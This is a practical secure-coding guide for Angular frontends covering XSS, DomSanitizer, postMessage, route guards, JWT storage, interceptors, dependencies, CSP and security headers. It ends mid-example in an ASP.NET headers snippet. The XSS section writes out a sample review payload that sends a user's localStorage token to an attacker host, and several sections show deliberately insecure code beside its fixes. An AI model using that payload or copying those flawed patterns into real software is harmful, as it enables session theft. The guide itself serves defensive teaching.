# Angular Frontend Security: A Practical Guide

*A hands-on guide for building secure Angular applications — written for developers who want to understand not just the rules, but the reasons behind them.*

Most of the examples in this guide are inspired by real issues found (and fixed) during security audits of production Angular e-commerce applications. The code has been generalized so it applies to any project.

---

## Table of Contents

1. [Why Frontend Security Matters](#1-why-frontend-security-matters)
2. [Frontend vs. Backend Security: Who Protects What?](#2-frontend-vs-backend-security-who-protects-what)
3. [Common Misconceptions](#3-common-misconceptions)
4. [XSS — Cross-Site Scripting](#4-xss--cross-site-scripting)
5. [Safe and Unsafe Usage of innerHTML](#5-safe-and-unsafe-usage-of-innerhtml)
6. [DomSanitizer and Its Common Mistakes](#6-domsanitizer-and-its-common-mistakes)
7. [Other DOM Dangers: ElementRef, postMessage, and Friends](#7-other-dom-dangers-elementref-postmessage-and-friends)
8. [Authentication and Authorization in Angular](#8-authentication-and-authorization-in-angular)
9. [Route Guards and Role-Based Access Control](#9-route-guards-and-role-based-access-control)
10. [Protecting Admin Areas](#10-protecting-admin-areas)
11. [JWT Handling and Token Storage](#11-jwt-handling-and-token-storage)
12. [localStorage, sessionStorage, and Cookies](#12-localstorage-sessionstorage-and-cookies)
13. [Secure HTTP Communication and Interceptors](#13-secure-http-communication-and-interceptors)
14. [Forms and User Input](#14-forms-and-user-input)
15. [Dependency and Package Security](#15-dependency-and-package-security)
16. [Environment Files and Sensitive Data](#16-environment-files-and-sensitive-data)
17. [CSP — Content Security Policy](#17-csp--content-security-policy)
18. [Security Headers](#18-security-headers)
19. [OWASP and Angular](#19-owasp-and-angular)
20. [The Complete Angular Security Checklist](#20-the-complete-angular-security-checklist)
21. [Common Mistakes Developers Make](#21-common-mistakes-developers-make)
22. [Key Takeaways](#22-key-takeaways)
23. [References](#23-references)

---

## 1. Why Frontend Security Matters

There is a popular belief that security is a backend topic. After all, the backend owns the database, validates the rules, and decides who can do what. So why care about the frontend?

Because the frontend is the part of your application that runs **inside the attacker's browser**. Every line of JavaScript you ship is:

- **Fully visible.** Anyone can open DevTools, read your bundle, and study your logic.
- **Fully modifiable.** Anyone can change variables, skip your `if` statements, and call your services directly.
- **Running next to the user's secrets.** Their session token, their personal data, their payment form — all live in the same browser tab as your code.

The frontend cannot *enforce* security (the attacker controls it), but it can absolutely *leak* security:

- It can leak **secrets** (a hardcoded API token in the bundle).
- It can leak **sessions** (a token stolen through XSS).
- It can leak **trust** (an unvalidated `postMessage` that accepts data from any website).
- It can mislead users (a guard that lets anonymous visitors into the checkout flow).

A secure frontend doesn't replace a secure backend. It makes sure the browser side of the conversation doesn't become the weakest link.

---

## 2. Frontend vs. Backend Security: Who Protects What?

This is the single most important mental model in this guide:

> **The frontend provides user experience. The backend provides enforcement.**

| Concern | Frontend's job | Backend's job |
|---|---|---|
| "Can this user see the admin menu?" | Hide the menu (UX) | Reject the API call (enforcement) |
| "Is this email valid?" | Show a friendly error early | Validate again, always |
| "Can this user delete a product?" | Disable the button | Check the role on the server |
| "Is this session real?" | Attach the token | Verify the token signature |

Everything the frontend does — guards, disabled buttons, hidden routes, form validators — is **advisory**. It guides honest users. A dishonest user bypasses it in seconds with DevTools or `curl`.

**Real-world example.** In one audited project, a directive disabled admin action buttons when the user lacked a role:

```ts
// This directive only DISABLES a button in the UI.
// It must never be the only protection.
@Directive({ selector: '[appCheckPolicy]' })
export class CheckPolicyDirective {
  // ...adds 'disabled' attribute if the user's role isn't allowed
}
```

That's good UX. But the *real* question is: what happens when an attacker sends the DELETE request directly with Postman? If the backend doesn't check the role again, the directive was decoration.

**Rule of thumb:** write your frontend checks for usability, then ask "what happens if someone skips this?" — the answer must always be "the backend says no."

---

## 3. Common Misconceptions

Let's clear these up early, because they cause real vulnerabilities:

**"My admin routes are lazy-loaded, so the code is hidden."**
False. Lazy chunks are still public files on your server. Anyone can download `admin-chunk.js` directly and read it — including any secrets you hardcoded in it. Route guards control *navigation*, not *file access*.

**"It's just a publishable/client-side key, all keys are fine in the frontend."**
Half true. Some keys are *designed* to be public (a Stripe publishable key, a Google OAuth client ID). Others are absolutely not (a signed JWT for a third-party service, any "secret" or "private" key). You must know which is which. See [Section 16](#16-environment-files-and-sensitive-data).

**"Angular sanitizes everything, so XSS is impossible."**
Angular's templates are very safe *by default*, but the framework gives you several escape hatches (`bypassSecurityTrust*`, direct DOM access, third-party libraries). XSS in Angular apps is rare — but almost always self-inflicted.

**"If the route guard returns false, the data is safe."**
No. The guard prevents *rendering a page*. The API behind that page must do its own authentication. A guard is a curtain, not a lock.

**"Nobody will read my bundle / git history."**
Secrets in a git history are leaked forever, even after you delete them from the code. Automated bots scan public repositories and published bundles for tokens around the clock. If a secret was ever committed or shipped, **rotate it**.

---

## 4. XSS — Cross-Site Scripting

### What it is

XSS means an attacker gets *their* JavaScript to run in *your* page, in the context of *your* user. Once that happens, the attacker's script can do anything your script can do:

- Read `localStorage` (and steal the auth token stored there).
- Read and submit forms (including password fields).
- Call your API with the victim's session.
- Rewrite the page (fake login forms, fake payment dialogs).

### A classic attack scenario

1. Your shop lets users write product reviews.
2. An attacker submits a review: `Great product! <img src=x onerror="fetch('https://evil.example/steal?t='+localStorage.getItem('token'))">`
3. Your app renders the review as raw HTML.
4. Every visitor who opens that product page silently sends their token to the attacker.
5. The attacker now has a valid session for every one of those users.

Notice: the victim did nothing wrong. They just opened a page.

### How Angular protects you

Angular treats all values in templates as **untrusted by default**. Interpolation and property binding *escape* the value — they render it as text, not as HTML:

```html
<!-- SAFE: even if review.text contains <script> tags,
     they are displayed as plain text, never executed. -->
<p>{{ review.text }}</p>
<div [title]="review.text"></div>
```

This is why most Angular apps are safe from XSS *as long as developers stay inside the template system*. The vulnerabilities appear when developers step outside it. The next three sections show exactly where.

---

## 5. Safe and Unsafe Usage of innerHTML

### The binding (mostly safe)

Angular sanitizes values bound with `[innerHTML]`. It strips dangerous parts (script tags, event handlers like `onerror`, `javascript:` URLs):

```html
<!-- Sanitized by Angular: scripts and event handlers are removed. -->
<div [innerHTML]="article.bodyHtml"></div>
```

This is *reasonably* safe, but understand what you get:

- ✅ `<script>` tags are removed.
- ✅ `onclick`, `onerror`, etc. are removed.
- ⚠️ The remaining HTML can still mess with your layout, inject misleading content, or include links you didn't intend.

So even sanitized `[innerHTML]` should only render content from sources you reasonably trust (e.g., your own CMS), not arbitrary user input.

### Direct DOM assignment (dangerous)

The moment you leave Angular's binding system, you lose the sanitizer entirely:

```ts
// ❌ INSECURE: no sanitization happens here at all.
// If userComment contains <img src=x onerror=...>, it executes.
ngAfterViewInit() {
  this.container.nativeElement.innerHTML = this.userComment;
}
```

```ts
// ✅ SECURE alternative 1: render text, not HTML.
this.container.nativeElement.textContent = this.userComment;

// ✅ SECURE alternative 2: stay in the template.
// <div>{{ userComment }}</div>
```

**Practical tip:** Search your codebase regularly for the dangerous sinks:

```bash
grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML\|document.write\|eval(" src/
```

In a healthy Angular project, this search should return (almost) nothing. If your audit finds zero hits, that is a genuinely strong position — keep it that way with code review.

---

## 6. DomSanitizer and Its Common Mistakes

`DomSanitizer` lets you tell Angular: *"trust this value, don't sanitize it."* That is sometimes necessary — and often abused.

### A legitimate use

Registering hardcoded SVG icons with Angular Material is a classic, safe use, because the input is a **constant written by you**, not data:

```ts
// ✅ ACCEPTABLE: the SVG strings are hardcoded constants in the source code.
// No user or API data can ever reach this call.
const GITHUB_ICON = `<svg xmlns="http://www.w3.org/2000/svg" ...>...</svg>`;

iconRegistry.addSvgIconLiteral(
  'github',
  sanitizer.bypassSecurityTrustHtml(GITHUB_ICON)
);
```

### The mistake that creates XSS

The same API becomes a vulnerability the moment **dynamic data** flows into it:

```ts
// ❌ INSECURE: "trusting" data that came from the server / user.
// You just disabled Angular's XSS protection for attacker-controlled content.
this.safeBio = this.sanitizer.bypassSecurityTrustHtml(user.bioHtml);
```

```html
<div [innerHTML]="safeBio"></div>  <!-- executes whatever was in user.bioHtml -->
```

If `user.bioHtml` is editable by users (or by anyone who can compromise the API response), you have handed them script execution on your page.

### The rule

> `bypassSecurityTrust*` is only acceptable for **values that are constants in your source code**. If the value travels through a variable that *could* contain user or API data, do not bypass — restructure instead.

Secure alternatives, in order of preference:

1. Don't render HTML at all — render text (`{{ value }}`).
2. Render limited HTML through `[innerHTML]` and let Angular sanitize it.
3. If you truly need rich content, sanitize **on the server** with an allowlist library, and treat the output as content, not trust.

Also be aware of the whole family — they all need the same discipline:

| Method | Unlocks | Typical abuse |
|---|---|---|
| `bypassSecurityTrustHtml` | Raw HTML | User bios, comments, CMS fields |
| `bypassSecurityTrustUrl` | `href`/`src` URLs | "Open user's website" links (`javascript:` URLs) |
| `bypassSecurityTrustResourceUrl` | iframes, scripts | Embedding a URL that came from data |
| `bypassSecurityTrustScript` | Script content | Almost never legitimate |
| `bypassSecurityTrustStyle` | CSS | Style injection, UI redressing |

---

## 7. Other DOM Dangers: ElementRef, postMessage, and Friends

### ElementRef and Renderer2

Direct DOM access is not automatically insecure. These are all fine:

```ts
// ✅ Setting a style on a known element.
this.renderer.setStyle(document.body, 'overflow', 'auto');

// ✅ Reading/writing an input's value (it's a property, not HTML).
this.searchInput().nativeElement.value = '';

// ✅ Toggling CSS classes.
this.renderer.addClass(icon, 'icon-disabled');
```

The danger is specifically **injecting markup or URLs** from dynamic data (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, setting `src`/`href` from user data). Touching properties, classes, and styles with your own values is normal Angular work.

### postMessage — the forgotten attack surface

If your app embeds a third-party tool in an iframe (a payment widget, a design editor, a preview pane), you probably communicate with `window.postMessage`. Two rules are violated constantly, and both were found in a real audit:

**Rule 1: Always validate `event.origin` when receiving messages.**

```ts
// ❌ INSECURE: ANY website open in another tab/window can post to you.
// An attacker page can forge { cmd: 'saveDone', token: 'attacker-value' }
// and your app will happily trust it.
window.addEventListener('message', (event) => {
  if (event.data.cmd === 'saveDone') {
    this.saveToken.set(event.data.token);
  }
});
```

```ts
// ✅ SECURE: only accept messages from the exact origin you embedded.
const EDITOR_ORIGIN = 'https://editor.example.com';

window.addEventListener('message', (event) => {
  if (event.origin !== EDITOR_ORIGIN) {
    return; // drop everything else, silently
  }
  if (event.data?.cmd === 'saveDone') {
    this.saveToken.set(event.data.token);
  }
});
```

**Rule 2: Never send sensitive data with `targetOrigin: "*"`.**

```ts
// ❌ INSECURE: if the iframe was navigated to another site,
// that site receives your token.
iframe.contentWindow?.postMessage({ token: shopToken }, '*');

// ✅ SECURE: the browser delivers the message ONLY if the iframe
// is really on the origin you expect.
iframe.contentWindow?.postMessage({ token: shopToken }, EDITOR_ORIGIN);
```

Think of `postMessage` like an API endpoint: it has callers you don't control, so it needs authentication (`event.origin`) and an explicit recipient (`targetOrigin`).

---

## 8. Authentication and Authorization in Angular

First, two words that get mixed up:

- **Authentication** — *who are you?* (login, tokens, sessions)
- **Authorization** — *what are you allowed to do?* (roles, policies, permissions)

### A typical SPA authentication flow

1. The user submits credentials to `POST /api/account/login`.
2. The backend verifies them and returns a short-lived **access token** (often a JWT), and sets a long-lived **refresh token** (ideally in an HttpOnly cookie).
3. The frontend attaches the access token to API requests (`Authorization: Bearer ...`).
4. When the access token expires, an interceptor silently calls `POST /api/account/refresh-token` and retries.
5. On logout, the frontend clears its local state and the backend revokes the refresh token.

### Logout must be fail-safe

Here is a subtle real-world bug. This logout only clears the local token **if the server call succeeds**:

```ts
// ❌ FLAWED: if the network drops or the server errors,
// the token stays in the browser and the user stays "logged in".
logout(): void {
  this.http.post(`${this.baseUrl}account/logout`, {}).subscribe(() => {
    this.storage.delete('token');      // ← only runs on success!
    this.router.navigateByUrl('/account/login');
  });
}
```

Why it matters: imagine a shared or public computer. The user clicks "Logout", the Wi-Fi hiccups, the request fails silently — and the next person at the machine has a live session.

```ts
// ✅ SECURE: server call first (it still needs the token to revoke
// the session), but local cleanup ALWAYS runs — success or failure.
logout(): void {
  this.http.post(`${this.baseUrl}account/logout`, {}).pipe(
    catchError(err => {
      console.error('Server-side logout failed', err);
      return of(null);                 // swallow the error...
    }),
    finalize(() => {                   // ...but always clean up
      this.clearLocalSession();        // delete token, reset user state
      this.router.navigateByUrl('/account/login');
    })
  ).subscribe();
}
```

`finalize()` is the RxJS equivalent of a `finally` block — it runs whether the observable completes or errors. That's exactly the guarantee logout needs.

---

## 9. Route Guards and Role-Based Access Control

### Guards in modern Angular

Modern Angular uses functional guards:

```ts
export const authGuard: CanMatchFn = (route, segments) => {
  // return true / false / UrlTree (or an Observable of those)
};
```

You attach them to routes:

```ts
{ path: 'checkout', canMatch: [authGuard], loadChildren: ... },
{ path: 'admin',    canMatch: [authGuard], data: { policy: 'RequireAdmin' }, ... },
```

### The most dangerous guard pattern: default-allow

This is a real bug found in a production application, and it's worth studying carefully. The guard supported optional role "policies" via route data — and **allowed access when no policy was configured**:

```ts
// ❌ INSECURE: the default is ALLOW.
export const authGuard: CanMatchFn = (route, segments) => {
  const policyName = route.data?.['policy'] as string | undefined;

  if (!policyName) {
    return of(true);   // ← no policy? everyone may pass. Even anonymous users!
  }

  // ...check login + role only when a policy exists
};
```

Now look at the routes again:

```ts
// The developer clearly intended "logged-in users only"...
{ path: 'checkout', canMatch: [authGuard], ... },  // ← no policy in data!
{ path: 'orders',   canMatch: [authGuard], ... },  // ← no policy in data!
```

Because neither route declares a `policy`, the guard short-circuits to `true` — and **anonymous visitors walk straight into checkout and order history**. The guard was attached, the tests passed, the code *looked* protected. The default did the damage.

```ts
// ✅ SECURE: the default is DENY. Authentication is always required;
// a policy only ADDS a role check on top.
export const authGuard: CanMatchFn = (route, segments) => {
  const accountService = inject(AccountService);
  const authz = inject(AuthorizationService);
  const router = inject(Router);

  const policyName = route.data?.['policy'] as string | undefined;

  return accountService.currentUser$.pipe(
    switchMap(user => {
      if (!user) {
        // Not logged in → never allowed on a guarded route.
        router.navigate(['account/login'], {
          queryParams: { returnUrl: segments.map(s => s.path).join('/') }
        });
        return of(false);
      }
      if (!policyName) {
        return of(true);          // authenticated is enough here
      }
      return authz.getPolicy(policyName).pipe(
        map(allowedRoles => allowedRoles.includes(user.role))
      );
    })
  );
};
```

**The principle: fail closed.** When configuration is missing, when a service errors, when a value is undefined — a security check should deny, not allow. Apply the same thinking to interceptors, directives, and backend policies.

### Role checks belong on the server too

Even the fixed guard above is still *frontend* — a determined user can bypass it. Role-based access control must exist twice:

- **Frontend:** guards + UI hiding, for honest users and good UX.
- **Backend:** policy checks on every endpoint, for everyone else.

A nice pattern is to fetch the policy definitions (which roles satisfy which policy) from the backend, so frontend and backend stay in sync and there's a single source of truth.

---

## 10. Protecting Admin Areas

Admin areas concentrate risk: privileged actions, sensitive data, and often "internal" tools that get less security review than customer-facing pages. Checklist for any `/admin` section:

1. **Guard the parent route** so every child inherits the check:

```ts
export const ADMIN_ROUTES: Routes = [{
  path: '',
  component: AdminComponent,
  canMatch: [authGuard],
  data: { policy: 'RequireAdminPanelViewer' },
  children: [
    { path: 'products', loadChildren: ... },
    { path: 'users',    loadChildren: ... },
    // every child is behind the guard automatically
  ]
}];
```

2. **Remember: lazy chunks are public.** Guarding `/admin` stops *navigation*, but `admin-chunk.js` is still downloadable by anyone. Consequences:
   - Never put secrets in admin components ("only admins see this page" is not true for the *code*).
   - Don't rely on the obscurity of admin UI logic.

3. **Backend authorization on every admin endpoint.** The frontend guard is the curtain; the `[Authorize(Policy = "...")]` on the API is the lock.

4. **Watch for privilege escalation paths.** If an admin screen lets someone edit users, can a low-privilege admin assign themselves a higher role? That rule must be enforced server-side (e.g., "only SuperAdmin can change roles"), not just hidden in the UI.

5. **Internal tools deserve the same review.** In one audit, the most serious finding (a hardcoded third-party token, see Section 16) lived in an admin-only utility page — exactly the kind of code nobody reviews because "it's just internal".

---

## 11. JWT Handling and Token Storage

### What a JWT is (and isn't)

A JWT is a signed, **readable** piece of data. Anyone holding it can decode the payload (it's just Base64) — so never put secrets *inside* a token. The signature only proves who issued it, not who is allowed to read it.

Two properties matter for storage decisions:

- **Bearer token:** whoever holds it, *is* the user. Stealing the token = stealing the session.
- **Hard to revoke:** a stolen JWT usually stays valid until it expires.

### Where to store it — the honest comparison

| Storage | Stolen by XSS? | Sent automatically (CSRF risk)? | Survives refresh? | Verdict |
|---|---|---|---|---|
| `localStorage` | **Yes** — any injected JS reads it | No | Yes | Common, but weakest against XSS |
| `sessionStorage` | **Yes** | No | Per-tab only | Same XSS problem, worse UX |
| In-memory (a signal/variable) | Mostly no* | No | **No** | Best for access tokens |
| HttpOnly cookie | **No** — JS can't read it | Yes — needs CSRF defense (`SameSite`, tokens) | Yes | Best for refresh tokens |

\* In-memory tokens can still be exfiltrated by sophisticated injected code while the app runs, but they don't sit on disk waiting to be read, and they vanish when the tab closes.

### The recommended pattern

> **Short-lived access token in memory + long-lived refresh token in an HttpOnly, Secure, SameSite cookie.**

How it works:

```ts
// access token lives ONLY in a service field — never written to storage.
@Injectable({ providedIn: 'root' })
export class SessionService {
  private accessToken: string | null = null;

  setToken(t: string | null) { this.accessToken = t; }
  getToken() { return this.accessToken; }
}
```

1. Login → backend returns the access token in the **response body** (frontend keeps it in memory) and sets the refresh token as an **HttpOnly cookie** (frontend never sees it).
2. On app start (or page refresh), the frontend has no token — so it calls `POST /refresh-token`. The browser sends the cookie automatically; the backend returns a fresh access token.
3. The access token expires after minutes, limiting the damage window if it ever leaks.

Why this is better: an XSS payload can no longer simply run `localStorage.getItem('token')` and walk away with a long-lived session. The HttpOnly cookie is invisible to JavaScript by design.

### If you do use localStorage today

Many apps store the JWT in `localStorage` because it's simple, and migrating needs backend changes. If that's your situation, be honest about the trade-off and compensate:

- Keep access tokens **short-lived** (minutes, not days) with refresh rotation.
- Be extra strict about XSS (Sections 4–7) — it's now your single point of failure.
- Plan the migration to the in-memory + HttpOnly-cookie pattern.
- Never *also* log the token or send it to third parties (next sections).

---

## 12. localStorage, sessionStorage, and Cookies

A quick decision guide for everything else you might store in the browser:

**Fine to store client-side** (worst case if stolen: nothing or mild):
- UI theme, language preference
- Cookie-consent flags
- A basket/cart ID (the backend should still verify ownership)
- Non-sensitive caches

**Think twice:**
- Email addresses, names, profile data — it's PII; prefer fetching it per session.
- Feature flags that gate "secret" features — they're not secret.

**Never store in JS-readable storage:**
- Auth/refresh tokens (see Section 11 for the better pattern)
- API secrets of any kind
- Payment data of any kind

Two implementation tips:

```ts
// Centralize storage access in one service. Benefits:
// - one place to audit what your app persists,
// - consistent JSON handling and error handling,
// - easy to swap the storage strategy later.
@Injectable({ providedIn: 'root' })
export class StorageService {
  get<T>(key: string): T | null { /* try/catch + JSON.parse */ }
  set<T>(key: string, value: T): boolean { /* try/catch + JSON.stringify */ }
  delete(key: string): void { /* ... */ }
}
```

And: **treat values read from storage as untrusted input.** The user (or an attacker with brief access) can edit localStorage freely in DevTools. If you read a `basket_id` from storage and put it in a URL, encode it properly (see Section 13) — and the backend must verify the basket actually belongs to this session.

---

## 13. Secure HTTP Communication and Interceptors

### HTTPS everywhere

Non-negotiable in production. Serve the app over HTTPS, call APIs over HTTPS, and enable HSTS (Section 18) so browsers refuse to downgrade.

### The interceptor that leaks tokens

An HTTP interceptor that attaches your auth token is standard. Here's the standard *bug* that comes with it:

```ts
// ❌ INSECURE: attaches the user's token to EVERY outgoing request —
// including requests to third-party hosts.
export const jwtInterceptor: HttpInterceptorFn = (request, next) => {
  const token = getToken();
  if (token) {
    request = request.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }
  return next(request);
};
```

Why it's dangerous: today all your `HttpClient` calls go to your own API, so nothing visibly breaks. Then one day someone adds a call to a third-party service, a CDN, an analytics endpoint — or builds a URL from data — and your users' session tokens silently travel to a host you don't control. The same applies to refresh-on-401 logic: a third-party 401 should not burn your refresh token.

```ts
// ✅ SECURE: the token (and the 401-refresh logic) applies ONLY
// to requests aimed at your own API origin.
export const jwtInterceptor: HttpInterceptorFn = (request, next) => {
  const isApiRequest = request.url.startsWith(environment.apiUrl);
  const token = getToken();

  if (token && isApiRequest) {
    request = request.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }

  return next(request).pipe(
    catchError(error => {
      if (error.status === 401 && isApiRequest) {
        return refreshAndRetry(request, next);   // refresh only for our API
      }
      return throwError(() => error);
    })
  );
};
```

### Encode user input in URLs — use HttpParams

String interpolation into URLs is an injection waiting to happen:

```ts
// ❌ FRAGILE: an email like "a+b@x.com&admin=true" breaks the query string
// (the '+' becomes a space; the '&' starts a new parameter).
checkEmailExists(email: string) {
  return this.http.get<boolean>(`${this.baseUrl}account/emailexists?email=${email}`);
}
```

```ts
// ✅ SECURE: HttpParams URL-encodes every value correctly.
checkEmailExists(email: string) {
  const params = new HttpParams().set('email', email);
  return this.http.get<boolean>(`${this.baseUrl}account/emailexists`, { params });
}
```

This matters even for values you "control" — remember that localStorage values, route params, and query params are all user-editable.

### Don't log secrets

Console logs ship to production too. Audit them:

```ts
// ❌ Found in a real codebase: logs a security token to every
// admin's console (and to anyone looking over their shoulder,
// any screen recording, any browser extension reading the console).
console.log('Received saveToken:', event.data.token);

// ❌ Also risky: logging entire error objects can expose
// auth headers, request bodies, or PII contained in the response.
console.error(error);
```

Practical rules:

- Never log tokens, passwords, or full request/response objects.
- Log error *messages* and *status codes*, not raw payloads.
- Consider stripping `console.*` from production builds entirely.

### Error handling that doesn't overshare

Show users friendly messages; keep technical detail out of the UI:

```ts
// A centralized error handler (driven by an interceptor) keeps this consistent:
case 401: message = 'Please log in again.'; break;
case 403: message = 'You do not have permission to perform this action.'; break;
case 500: message = 'A server error occurred. Please try again later.'; break;
// Don't surface stack traces or raw server errors to end users.
```

(And on the backend: never send stack traces to the client in production.)

---

## 14. Forms and User Input

### Client-side validation is UX, not security

Repeat after me: *every validator I write in Angular also exists on the server.* Client validation gives instant feedback; server validation is the actual gate. Anyone can submit your form's API request directly with any payload.

```ts
// Frontend (signal forms): great UX...
readonly registerForm = form(this.model, (path) => {
  required(path.email, { message: 'Email address is required' });
  pattern(path.email, EMAIL_REGEX, { message: 'Invalid email address' });
  required(path.password, { message: 'Password is required' });
  pattern(path.password, PASSWORD_REGEX, {
    message: 'Password must have 1 uppercase, 1 lowercase, 1 number, 1 symbol, min 6 chars',
  });
});
// ...but the backend MUST re-validate email format, password policy,
// uniqueness, and everything else.
```

### Practical input rules

- **Passwords:** enforce a sensible policy, never log them, never store them anywhere client-side, use `type="password"` and `autocomplete="new-password"` / `current-password` appropriately.
- **Free-text fields** (names, comments, addresses): you don't need to "sanitize HTML" on input as long as you *render* them safely (interpolation, Section 4). Escaping belongs at output time, in context.
- **File uploads:** restrict type and size client-side for UX (`allowedFileType`, `maxFileSize`) — and verify type, size, and content server-side, because the client checks are trivially bypassed.
- **Hidden fields and disabled inputs are suggestions.** An attacker can edit or enable them. Any value that matters must be validated server-side against the user's actual permissions.
- **IDs in requests** (basket IDs, order IDs, user IDs): the backend must check *ownership*, not just existence — otherwise you have an IDOR (Insecure Direct Object Reference) vulnerability.

---

## 15. Dependency and Package Security

Your app is not just your code — it's your code plus hundreds of npm packages, each a potential entry point (this is "supply chain" risk).

### The basics

```bash
# Run regularly and in CI:
npm audit

# Fix what's fixable:
npm audit fix
```

`npm audit` reporting **0 vulnerabilities** is necessary but not sufficient. Also review your `package.json` for these patterns (all found in real projects):

```jsonc
{
  "dependencies": {
    "some-tool": "*",            // ❌ wildcard: ANY future version auto-installs,
                                 //    including a hijacked malicious release
    "uuidv4": "^1.0.0",          // ❌ deprecated package, duplicate of "uuid"
    "font-awesome": "^4.7.0",    // ❌ 2016-era package, duplicated by the
                                 //    maintained @fortawesome packages
    "left-over-lib": "^2.0.0"    // ❌ unused — every dependency you don't
                                 //    need is attack surface you don't need
  }
}
```

### Rules of thumb

1. **Pin sensibly.** Use `^x.y.z` ranges plus a committed lockfile (`package-lock.json`). Never `*` or `latest`.
2. **Fewer is safer.** Before adding a package, ask: could I write these 30 lines myself? Remove packages you no longer use.
3. **Prefer maintained packages.** A library with no release in 5 years won't get security patches.
4. **Avoid duplicates.** Two icon libraries, three versions of Stripe typings — each duplicate doubles the audit surface.
5. **Update Angular itself.** The framework regularly patches security-relevant bugs; staying within supported major versions matters.
6. **Watch the install scripts.** Packages can run arbitrary code at install time. CI that installs dependencies should run with least privilege.

---

## 16. Environment Files and Sensitive Data

### The golden rule

> **Everything in your frontend build is public.** Environment files, components, lazy chunks, source maps — all of it ships to the browser. "Frontend secret" is a contradiction.

### Public-by-design vs. actually secret

Some values *look* scary but are designed to be public:

```ts
// ✅ FINE in environment files — these are public by design:
export const environment = {
  production: true,
  apiUrl: 'api/',
  googleClientId: '1234-abc.apps.googleusercontent.com', // OAuth client ID: public
  stripePublishableKey: 'pk_live_...',                   // "publishable" = public
};
```

- A **Stripe publishable key** (`pk_...`) can only tokenize cards — it cannot charge anyone. The **secret key** (`sk_...`) must never leave the backend.
- A **Google OAuth client ID** identifies your app; the *client secret* stays server-side.

Still, keep even public keys in environment files rather than scattered in components — it's configuration, and you'll thank yourself when rotating. (Bonus real-world catch: centralizing the Stripe keys exposed that the *production* build had been quietly using the **test** key.)

### The Critical finding: a hardcoded third-party JWT

This pattern, found in a real admin component, is what a Critical severity looks like:

```ts
// ❌ CRITICAL: a signed token for a third-party SaaS,
// hardcoded in a component — and valid for 30+ years.
export class DesignEditorComponent {
  shopToken = 'eyJhbGciOiJSUzI1NiIs...<800 more characters>...';
  // ...
}
```

Why this is so bad:

1. **It ships to everyone.** The component was lazy-loaded behind an admin guard — irrelevant. The chunk is a public file; anyone can download and read it.
2. **It's in git forever.** Even after deleting the line, the token remains in every clone's history.
3. **It's long-lived.** With a 2057 expiry, "wait for it to expire" is not a plan.
4. **It's a real credential.** Anyone extracting it can use the third-party service as you: consume your quota, access your templates, run up your bill.

The fix has two parts, and **both** are mandatory:

```ts
// ✅ Part 1 (code): the frontend fetches a token from YOUR backend,
// which holds the real secret in server-side configuration.
private loadShopToken(): void {
  this.http.get<{ token: string }>(`${this.baseUrl}designEditor/shop-token`)
    .subscribe({
      next: (data) => this.shopToken.set(data.token),
      error: (err) => console.error('Could not load editor token.', err),
    });
}
```

> ✅ **Part 2 (operations): rotate the leaked token at the provider.** Removing a secret from code does not un-leak it. If a secret was ever committed or shipped, treat it as compromised and revoke it.

Ideally, the backend endpoint returns a **short-lived, narrowly-scoped** token rather than the master credential.

### Quick self-audit

```bash
# Hunt for likely secrets in your frontend source:
grep -rnE "(eyJ[A-Za-z0-9_-]{20,}|sk_live|api[_-]?key|secret|password\s*[:=])" src/ \
  --include="*.ts" --include="*.html"
```

Long `eyJ...` strings are Base64-encoded JWTs — in frontend source code, they are almost always a finding.

---

## 17. CSP — Content Security Policy

CSP is an HTTP header that tells the browser *which sources of content your page is allowed to use*. It is your strongest defense-in-depth against XSS: even if an injection bug slips through, CSP can stop the attacker's script from loading or phoning home.

### A realistic policy

For a typical Angular shop using Stripe, Google sign-in, a CDN for images, and a fonts CDN:

```
Content-Security-Policy:
  default-src 'self';
  script-src  'self' https://js.stripe.com https://accounts.google.com;
  style-src   'self' 'unsafe-inline' https://fonts.example-cdn.net;
  font-src    'self' https://fonts.example-cdn.net;
  img-src     'self' data: blob: https://images.example-cdn.com;
  frame-src   https://js.stripe.com https://accounts.google.com;
  connect-src 'self' https://api.stripe.com wss:;
  base-uri    'self';
  form-action 'self';
  frame-ancestors 'none';
```

Reading it: scripts may only come from your own origin, Stripe, and Google. Images only from your origin and your image CDN. Nothing may iframe your site. A successful XSS payload that tries to `fetch('https://evil.example/...')` gets blocked by `connect-src`.

### The practical workflow

1. **Start in report-only mode.** A wrong CSP silently breaks your app (payments! login!), so test first:

   ```
   Content-Security-Policy-Report-Only: <your draft policy>
   ```

   The browser logs violations without blocking anything. Watch the console (or a report endpoint) for a few days, fix the policy, then switch to enforcing.

2. **Inventory your third parties first.** Walk through your `index.html` and network tab: payment scripts, OAuth widgets, font CDNs, image CDNs, websockets, embedded editors. Each needs an allowance in the right directive.

3. **Deal with inline scripts and styles.** Angular apps often have small inline `<script>` blocks in `index.html` (theme-before-paint, consent banners). Under a strict CSP these need either:
   - extraction into bundled files (cleanest),
   - a `nonce-...` attribute generated per-response by the server, or
   - a `sha256-...` hash in the policy.

   Angular's component styles typically require `'unsafe-inline'` for `style-src` (or hash/nonce setups) — an accepted trade-off in most apps, since CSS injection is far less dangerous than script injection. **Never** add `'unsafe-inline'` or `'unsafe-eval'` to `script-src`.

4. **Set it on the server.** If your SPA is served by a backend (e.g., from an ASP.NET wwwroot folder or nginx), the header belongs in that server's configuration — there is no frontend file that can set real response headers. A `<meta http-equiv>` CSP exists but is weaker (no `frame-ancestors`, no reporting) — use it only when you truly can't touch the server.

---

## 18. Security Headers

Beyond CSP, a small set of headers closes whole bug classes. These are server configuration, but frontend developers should know them and ask for them:

| Header | Recommended value | What it prevents |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Protocol-downgrade attacks; browser always uses HTTPS |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing (e.g., an "image" being executed as script) |
| `X-Frame-Options` | `DENY` | Clickjacking — your app inside an attacker's invisible iframe |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Leaking full URLs (with IDs/tokens in them) to other sites |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Injected/third-party code using powerful browser APIs |
| `Content-Security-Policy` | See Section 17 | XSS impact, data exfiltration, rogue embeds |

Example for an ASP.NET Core backend serving the Angular app:

```csharp
app.Use(async (context, next) =>
{
    var h = context.Response.Headers;
    h["X-Content-Type-Options"] = "nosniff";
    h["X-Frame-Options"] = "DENY";
    h["Referrer-Policy"] = "strict-origin-when-cross-origin";
